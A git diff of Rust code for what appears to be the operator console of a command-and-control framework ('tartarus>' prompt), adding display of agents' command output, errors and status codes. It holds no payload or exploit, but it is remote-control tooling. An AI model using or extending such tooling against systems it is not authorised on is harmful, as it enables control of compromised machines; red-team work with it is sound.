@@ -34,7 +34,7 @@ ___________              __                                                     
         let readline = rl.readline("tartarus> ");
         match readline {
             Ok(line) => {
-                rl.add_history_entry(line.as_str());
+                let _ = rl.add_history_entry(line.as_str());
                 let command = line.trim();
 
                 match command {
@@ -114,18 +114,44 @@ async fn execute_command(shared_state: &SharedState, agent_id: u64, command: &st
                 os: None,
             },
             instruction: AgentInstructionBody::Command {
-                command_id: 0, // TODO: Replace with unique ID generation logic
                 command: command.into(),
+                command_id: 0, // TODO: Replace with unique ID generation logic
                 args: vec![],
             },
         };
 
         agent.instruction_history.push(instruction);
-        println!("Command sent successfully.");
+
+        // Simulate fetching response
+        println!("Waiting for response from Agent {}...", agent_id);
+        if let Some(response) = agent.response_history.last() {
+            match &response.packet_body {
+                AgentResponseBody::CommandResponse {
+                    stdout,
+                    stderr,
+                    status_code,
+                    ..
+                } => {
+                    // Command output is available here
+                    println!("Command Output:\n{}\n", stdout);
+                    if !stderr.is_empty() {
+                        println!("Command Errors:\n{}\n", stderr);
+                    }
+                    println!("Status Code: {}", status_code);
+                }
+                _ => {
+                    // If the response is not of type CommandResponse
+                    println!("Unhandled response variant from Agent {}.", agent_id);
+                }
+            }
+        } else {
+            println!("No response received from Agent {}.", agent_id);
+        }
     } else {
         println!("Agent with ID {} not found.", agent_id);
     }
 }
+
 
 async fn push_command(shared_state: &SharedState, command: &str) {
     let mut state = shared_state.write().await;
